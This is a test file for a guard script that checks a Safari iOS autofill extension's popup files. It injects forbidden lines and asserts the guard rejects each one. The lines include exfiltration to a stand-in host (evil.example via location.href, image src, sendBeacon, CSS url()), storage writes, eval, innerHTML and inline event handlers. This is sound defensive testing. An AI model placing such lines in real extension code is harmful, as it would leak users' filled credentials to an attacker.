// What popup-guard.mjs refuses: each change below is made to a copy of the popup's files. Run by scripts/test-safari-fill.sh.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { popupProblems } from './popup-guard.mjs';

const repo = fileURLToPath(new URL('../../', import.meta.url));
const WEB = 'Extensions/SafariIOS/web';
const SHARED = 'Extensions/Browser/src';

/** The problems after `change(file helpers)` on a fresh copy. */
function after(change) {
  fs.mkdirSync(path.join(repo, 'build'), { recursive: true });
  const root = fs.mkdtempSync(path.join(repo, 'build/popup-guard-'));
  try {
    fs.cpSync(path.join(repo, WEB), path.join(root, WEB), { recursive: true });
    fs.mkdirSync(path.join(root, SHARED), { recursive: true });
    for (const file of ['page-fill.js', 'display.js', 'origin.js', 'popup.html']) {
      fs.copyFileSync(path.join(repo, SHARED, file), path.join(root, SHARED, file));
    }
    const at = (file) => path.join(root, ['page-fill.js', 'display.js', 'origin.js'].includes(file) ? SHARED : WEB, file);
    change({
      add: (file, text) => fs.appendFileSync(at(file), `\n${text}\n`),
      swap: (file, from, to) => {
        const text = fs.readFileSync(at(file), 'utf8');
        assert.ok(text.includes(from), `${file} has no ${from}`);
        fs.writeFileSync(at(file), text.replace(from, () => to));
      }
    });
    return popupProblems(root);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

test('the popup as it is has no problem', () => {
  assert.deepEqual(after(() => {}), []);
});

const SCRIPT_LINES = [
  '/* note */ console.log(fields);', '/* a */ localStorage.setItem("k", value);', '* console.log(value)',
  "api['storage'].local.set({ value });", "api.storage.local.set({ value });", "globalThis['local' + 'Storage'];",
  'new Image().src = value;', "const i = new Image(); i['sr' + 'c'] = value;", "pixel.src = address + value;",
  "location.href='https://evil.example/?' + value;", "window.location = value;", "location.assign(value);",
  "const link = 'psss://evil';", "const link = 'https://evil.example/';", "const link = 'psss:' + '//evil';",
  "const link = '//evil.example/';", "api.tabs.create({ url: value });", "const other = api; other.cookies;",
  "api[name].set(value);", "window.open(value);", "document.title = value;", "node.setAttribute('src', value);",
  "element('img'); document.createElement('img');", "Object.assign(node, { src: value });", "navigator.sendBeacon(value);",
  "eval(value);", "node.innerHTML = value;"
];
for (const file of ['popup.js', 'popup-logic.js']) {
  test(`${file} may not hold any of these lines`, () => {
    for (const line of SCRIPT_LINES) assert.notDeepEqual(after(({ add }) => add(file, line)), [], line);
  });
}

test('the shared scripts may not keep, send, print or go anywhere either', () => {
  for (const file of ['page-fill.js', 'display.js', 'origin.js']) {
    for (const line of ['/* note */ console.log(fields);', "new Image().src = value;", "location.href='https://evil.example/';",
      "const link = 'psss://evil';", "chrome['storage'].local;", '/* */ fetch(value);']) {
      assert.notDeepEqual(after(({ add }) => add(file, line)), [], `${file}: ${line}`);
    }
  }
});

test('the HTML takes only what is listed', () => {
  for (const [from, to] of [
    ['</body>', '<SCRIPT>send()</SCRIPT></body>'], ['</body>', '<Script src="popup.js"></Script></body>'],
    ['</body>', '<script>send()</script></body>'], ['<body>', '<body onload="send()">'], ['<body>', '<body ONLOAD="send()">'],
    ['<main ', '<main onclick=send() '], ['</body>', '<img src="https://evil.example/a"></body>'],
    ['</body>', '<iframe></iframe></body>'], ['href="popup.css"', 'href="https://evil.example/a.css"'],
    ['<body>', '<body><meta http-equiv="refresh" content="0;url=x">'], ['</body>', "<div onerror='x'></div></body>"],
    ['</body>', '<a href="psss://evil">x</a></body>'], ['fill="currentColor"', 'fill="url(https://evil.example/a)"']
  ]) {
    assert.notDeepEqual(after(({ swap }) => swap('popup.html', from, to)), [], to);
  }
});

test('the styles load nothing', () => {
  for (const line of ['body { background: url(https://evil.example/a); }', '@import "x.css";', 'body { background: URL(a.png) }']) {
    assert.notDeepEqual(after(({ add }) => add('popup.css', line)), [], line);
  }
});

test('no other file may lie in the web folder, hidden or not', () => {
  for (const file of ['.extra.js', 'extra.js', '.hidden']) {
    assert.notDeepEqual(after(({ add }) => add(file, 'send()')), [], file);
  }
});
